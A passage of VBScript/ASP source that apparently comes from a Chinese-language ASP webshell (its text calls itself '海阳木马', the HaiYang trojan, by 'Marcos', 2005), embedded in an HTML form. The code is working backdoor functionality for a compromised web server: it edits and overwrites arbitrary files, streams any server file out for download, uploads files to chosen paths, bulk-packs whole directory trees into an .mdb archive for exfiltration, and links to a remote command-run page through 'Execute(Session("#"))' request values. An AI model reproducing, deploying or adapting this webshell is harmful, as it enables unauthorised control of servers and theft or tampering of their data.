		echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" &amp; vbNewLine
		echo "usePath.value = me.id;" &amp; vbNewLine
		echo "status = me.title;" &amp; vbNewLine
		echo "me.className = 'anotherSpan';" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function changeThePath(me){" &amp; vbNewLine
		echo "location.href = '?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;thePath=' + me.id;" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function fixTheLayer(strObj){" &amp; vbNewLine
		echo "var objStyle=document.getElementById(strObj).style;" &amp; vbNewLine
		echo "objStyle.width = document.body.clientWidth;" &amp; vbNewLine
		echo "objStyle.top = document.body.scrollTop + 2;" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function openUrl(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=openUrl&amp;thePath=' + usePath.value);" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function newOne(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=newOne&amp;thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function editFile(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=showEdit&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function appDoAction(act){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=' + act + '&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function downTheFile(){" &amp; vbNewLine
		echo "if(confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先把文件复制到当前站点目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载.')){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=downTheFile&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function appDoAction2(act){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=' + act + '&amp;thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function appTheAttributes(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=theAttributes&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function appRename(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=rename&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function upTheFile(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=showUpload&amp;thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function wsLoadIFrame(){" &amp; vbNewLine
		echo "cmdResult.location.href = '?%23=Execute(Session(%22%23%22))&amp;pageName=SaCmdRun&amp;theAct=readResult';" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function fsoRename(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=showFsoRename&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function delOne(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=delOne&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function fsoGetAttributes(){" &amp; vbNewLine
		echo "newWin = window.open('?%23=Execute(Session(%22%23%22))&amp;pageName=' + pageName.value + '&amp;theAct=getAttributes&amp;thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "&lt;/script>"
	End Sub

	Sub openUrl(usePath)
		Dim theUrl, thePath
		
		thePath = Server.MapPath("/")
		
		If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
			theUrl = Mid(usePath, Len(thePath) + 1)
			theUrl = Replace(theUrl, "\", "/")
			If Left(theUrl, 1) = "/" Then
				theUrl = Mid(theUrl, 2)
			End If
			Response.Redirect("/" &amp; theUrl)
		 Else
			alertThenClose("您所要打开的文件不在本站点目录下\n您可以尝试把要打开(下载)的文件粘贴到\n站点目录下,然后再打开(下载)!")
			Response.End
		End If
	End Sub
	
	Sub showEdit(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, unEditableExt
		
		If Right(thePath, 1) = "\" Then
			alertThenClose("编辑文件夹操作是非法的.")
			Response.End
		End If
		
		unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
		
		echo "&lt;style>body{border:none;overflow:hidden;background-color:buttonface;}&lt;/style>"
		echo "&lt;body topmargin=9>"
		echo "&lt;form method=post style='margin:0;width:100%;height:100%;'>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;textarea name=fileContent style='width:100%;height:90%;'>"
		If strMethod = "stream" Then
			echo HtmlEncode(streamLoadFromFile(thePath))
		 Else
			Set theFile = fsoX.OpenTextFile(thePath, 1)
			echo HtmlEncode(theFile.ReadAll())
			theFile.Close
			Set theFile = Nothing
		End If
		echo "&lt;/textarea>&lt;hr/>"
		echo "&lt;div align=right>"
		echo "保存为:&lt;input size=30 name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """> "
		echo "&lt;input type=checkbox name='windowStatus' id=windowStatus"
		If Request.Cookies(m &amp; "windowStatus") = "True" Then
			echo " checked"
		End If
		echo ">&lt;label for=windowStatus>保存后关闭窗口&lt;/label> "
		echo "&lt;input type=submit value=' 保存 '>&lt;input type=hidden value='saveFile' name=theAct>"
		echo "&lt;input type=reset value=' 恢复 '>"
		echo "&lt;input type=button value=' 清空 ' onclick=this.form.fileContent.innerText='';>"
		echo strJsCloseMe &amp; "&lt;/div>"
		echo "&lt;/form>"
		echo "&lt;/body>&lt;br/>"
		
	End Sub
	
	Sub saveToFile(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fileContent, windowStatus
		fileContent = Request("fileContent")
		windowStatus = Request("windowStatus")
		
		If strMethod = "stream" Then
			streamSaveToFile thePath, fileContent
			chkErr(Err)
		 Else
			fsoSaveToFile thePath, fileContent
			chkErr(Err)
		End If
		
		If windowStatus = "on" Then
			Response.Cookies(m &amp; "windowStatus") = "True"
			Response.Write "&lt;script>window.close();&lt;/script>"
		 Else
			Response.Cookies(m &amp; "windowStatus") = "False"
			Call showEdit(thePath, strMethod)
		End If
	End Sub
	
	Sub fsoSaveToFile(thePath, fileContent)
		Dim theFile
		Set theFile = fsoX.OpenTextFile(thePath, 2, True)
		theFile.Write fileContent
		theFile.Close
		Set theFile = Nothing
	End Sub
	
	Function streamLoadFromFile(thePath)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			.LoadFromFile thePath
			.LoadFromFile thePath
			If Request("pageName") &lt;> "TxtSearcher" Then
				chkErr(Err)
			End If
			.Charset="gb2312"
			.Position=2
			streamLoadFromFile=.ReadText()
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub downTheFile(thePath)
		Response.Clear
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim stream, fileName, fileContentType

		fileName = split(thePath,"\")(uBound(split(thePath,"\")))
		Set stream = Server.CreateObject("adodb.stream")
		stream.Open
		stream.Type = 1
		stream.LoadFromFile(thePath)
		chkErr(Err)
		Response.AddHeader "Content-Disposition", "attachment; filename=" &amp; fileName
		Response.AddHeader "Content-Length", stream.Size
		Response.Charset = "UTF-8"
		Response.ContentType = "application/octet-stream"
		Response.BinaryWrite stream.Read 
		Response.Flush
		stream.Close
		Set stream = Nothing
	End Sub
	
	Sub showUpload(thePath, pageName)
		echo "&lt;style>body{margin:8;overflow:hidden;}&lt;/style>"
		echo "&lt;form method=post enctype='multipart/form-data' action='?%23=Execute(Session(%22%23%22))&amp;pageName=" &amp; pageName &amp; "&amp;theAct=upload&amp;thePath=" &amp; UrlEncode(thePath) &amp; "' onsubmit='this.Submit.disabled=true;;'>"
		echo "上传文件: &lt;input name=file type=file size=31>&lt;br/>保存为: "
		echo "&lt;input name=fileName type=text value=""" &amp; HtmlEncode(thePath) &amp; """ size=33>"
		echo "&lt;input type=checkbox name=writeMode value=True>覆盖模式&lt;hr/>"
		echo "&lt;input name=Submit type=submit id=Submit value='上 传' onClick=""this.form.action+='&amp;fileName='+this.form.fileName.value+'&amp;theFile='+this.form.file.value+'&amp;overWrite='+this.form.writeMode.checked;"">"
		echo  strJsCloseMe
		echo "&lt;/form>"
	End Sub
	
	Sub streamUpload(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
		theFile = Request("theFile")
		fileName = Request("fileName")
		overWrite = Request("overWrite")

		If InStr(fileName, ":") &lt;= 0 Then
			fileName = thePath &amp; fileName
		End If

		Set stream = Server.CreateObject("adodb.stream")
		Set streamT = Server.CreateObject("adodb.stream")

		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Request.BinaryRead(Request.TotalBytes)
			.Position = 0
			fileContent = .Read()
			i = InStrB(fileContent, chrB(13) &amp; chrB(10))
			info = LeftB(fileContent, i - 1)
			i = Len(info) + 2
			i = InStrB(i, fileContent, chrB(13) &amp; chrB(10) &amp; chrB(13) &amp; chrB(10)) + 4 - 1
			j = InStrB(i, fileContent, info) - 1
			streamT.Type = 1
			streamT.Mode = 3
			streamT.Open
			stream.position = i
			.CopyTo streamT, j - i - 2
			If overWrite = "true" Then
				streamT.SaveToFile fileName, 2
			 Else
				streamT.SaveToFile fileName
			End If
			If Err.Number = 3004 Then
				Err.Clear
				fileName = fileName &amp; "\" &amp; Split(theFile, "\")(UBound(Split(theFile ,"\")))
				If overWrite="true" Then
					streamT.SaveToFile fileName, 2
				 Else
					streamT.SaveToFile fileName
				End If
			End If
			chkErr(Err)
			echo("&lt;script language=""javascript"">alert('文件上传成功!\n" &amp; Replace(fileName, "\", "\\") &amp; "');&lt;/script>")
			streamT.Close
			.Close
		End With
		
		Set stream = Nothing
		Set streamT = Nothing
	End Sub

	Function getDriveType(num)
		Select Case num
			Case 0
				getDriveType = "未知"
			Case 1
				getDriveType = "可移动磁盘"
			Case 2
				getDriveType = "本地硬盘"
			Case 3
				getDriveType = "网络磁盘"
			Case 4
				getDriveType = "CD-ROM"
			Case 5
				getDriveType = "RAM 磁盘"
		End Select
	End Function

	Function getFileIcon(extName)
		Select Case LCase(extName)
			Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
				getFileIcon = "Wingdings>2"
			Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
				getFileIcon = "Webdings>·"
			Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
				getFileIcon = "'webdings'>&amp;#159;"
			Case "exe", "com", "bat", "cmd", "scr", "msi"
				getFileIcon = "Webdings>1"
			Case "sys", "dll", "ocx"
				getFileIcon = "Wingdings>&amp;#255;"
			Case Else
				getFileIcon = "'Wingdings 2'>/"
		End Select
	End Function

	Function getStartType(num)
		Select Case num
			Case 2
				getStartType = "自动"
			Case 3
				getStartType = "手动"
			Case 4
				getStartType = "已禁用"
		End Select
	End Function

	Sub PageAddToMdb()
		Dim theAct, thePath
		theAct = Request("theAct")
		thePath = Request("thePath")
		Server.ScriptTimeOut = 5000

		showTitle("文件夹打包/解开器")

		If theAct = "addToMdb" Then
			addToMdb(thePath)
			alertThenClose("操作完成!")
			Response.End
		End If
		If theAct = "releaseFromMdb" Then
			unPack(thePath)
			alertThenClose("操作完成!")
			Response.End
		End If

		echo "文件夹打包:&lt;br/>"
		echo "&lt;form method=post target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=thePath value=""" &amp; HtmlEncode(Server.MapPath(".")) &amp; """ size=80>"
		echo "&lt;input type=hidden value=addToMdb name=theAct>"
		echo "&lt;select name=theMethod>&lt;option value=fso>FSO&lt;/option>&lt;option value=app>无FSO&lt;/option>"
		echo "&lt;/select>"
		echo "&lt;br>&lt;input type=submit value='开始打包'>"
		echo "&lt;hr/>注: 打包生成HYTop.mdb文件,位于海阳木马同级目录下"
		echo "&lt;/form>"

		echo "&lt;hr/>文件包解开(需FSO支持):&lt;br/>"
		echo "&lt;form method=post target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=thePath value=""" &amp; HtmlEncode(Server.MapPath(".")) &amp; "\HYTop.mdb"" size=80>"
		echo "&lt;input type=hidden value=releaseFromMdb name=theAct>&lt;input type=submit value='帮我解开'>"
		echo "&lt;hr/>注: 解开来的所有文件都位于海阳木马同级目录下"
		echo "&lt;/form>"


		echo "&lt;hr/>Powered By Marcos 2005.02"
	End Sub

	Sub addToMdb(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, stream, connStr, adoCatalog
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADODB.Connection")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" &amp; Server.MapPath("HYTop.mdb")

		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
		
		stream.Open
		stream.Type = 1
		rs.Open "FileData", conn, 3, 3
		
		If Request("theMethod") = "fso" Then
			fsoTreeForMdb thePath, rs, stream
		 Else
			saTreeForMdb thePath, rs, stream
		End If

		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
	End Sub

	Function fsoTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, folders, files, sysFileList
		sysFileList = "$HYTop.mdb$HYTop.ldb$"
		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath &amp; " 目录不存在或者不允许访问!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set files = theFolder.Files
		Set folders = theFolder.SubFolders

		For Each item In folders
			fsoTreeForMdb item.Path, rs, stream
		Next

		For Each item In files
			If InStr(sysFileList, "$" &amp; item.Name &amp; "$") &lt;= 0 Then
				rs.AddNew
				rs("thePath") = Mid(item.Path, 4)
				stream.LoadFromFile(item.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		Next

		Set files = Nothing
		Set folders = Nothing
		Set theFolder = Nothing
	End Function

	Sub unPack(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim rs, ws, str, conn, stream, connStr, theFolder
		str = Server.MapPath(".") &amp; "\"
		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADODB.Connection")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &amp; thePath &amp; ";"

		conn.Open connStr
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1

		Do Until rs.Eof
			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
			If fsoX.FolderExists(str &amp; theFolder) = False Then
				createFolder(str &amp; theFolder)
			End If
			stream.SetEos()
			stream.Write rs("fileContent")
			stream.SaveToFile str &amp; rs("thePath"), 2
			rs.MoveNext
		Loop

		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
	End Sub

	Sub createFolder(thePath)
		Dim i
		i = Instr(thePath, "\")
		Do While i > 0
			If fsoX.FolderExists(Left(thePath, i)) = False Then
				fsoX.CreateFolder(Left(thePath, i - 1))
			End If
			If InStr(Mid(thePath, i + 1), "\") Then
				i = i + Instr(Mid(thePath, i + 1), "\")
			 Else
				i = 0
			End If
		Loop
	End Sub

	Sub saTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, sysFileList
		sysFileList = "$HYTop.mdb$HYTop.ldb$"
		Set theFolder = saX.NameSpace(thePath)
		
		For Each item In theFolder.Items
			If item.IsFolder = True Then
				saTreeForMdb item.Path, rs, stream
			 Else
				If InStr(sysFileList, "$" &amp; item.Name &amp; "$") &lt;= 0 Then
					rs.AddNew
					rs("thePath") = Mid(item.Path, 4)
					stream.LoadFromFile(item.Path)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next

		Set theFolder = Nothing
	End Sub</textarea></td></tr><tr><td align="center" class="td"> <input type="submit" name="Submit3" value=" 提交 " onClick="this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"> <input type="reset" name="Submit32" value=" 重置 "></td></tr><tr><td class="trHead">&nbsp;</td></tr><tr> 
      <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782
http://hididi.net">Marcos</a> 2005.04&nbsp;</td>
    </tr></form></table></body></html>